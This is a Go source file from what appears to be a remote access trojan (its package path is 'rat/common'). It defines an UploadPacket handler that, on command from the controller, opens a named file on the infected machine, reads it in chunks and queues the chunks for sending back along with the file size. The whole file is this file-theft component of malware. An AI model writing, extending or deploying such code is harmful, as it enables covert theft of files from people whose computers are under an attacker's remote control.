package main

import (
	"fmt"
	"io"
	"os"
	"rat/common"
)

type UploadPacket struct {
	File  string `both`
	Final bool   `send`
	Data  []byte `send`
	Total int64  `send`
}

func (packet UploadPacket) Header() common.PacketHeader {
	return common.GetFileHeader
}

func (packet *UploadPacket) Init() {

}

func (packet UploadPacket) OnReceive() error {
	go func() {
		final := false
		local, err := os.Open(packet.File)
		defer local.Close()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		stat, err := local.Stat()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		for !final {
			data := make([]byte, common.TransferPacketSize)

			read, err := local.Read(data)
			if err == io.EOF {
				final = true
			} else if err != nil {
				fmt.Println(err.Error())
				return
			}
			Queue <- &UploadPacket{packet.File, final, data[:read], stat.Size()}
		}
	}()

	return nil
}
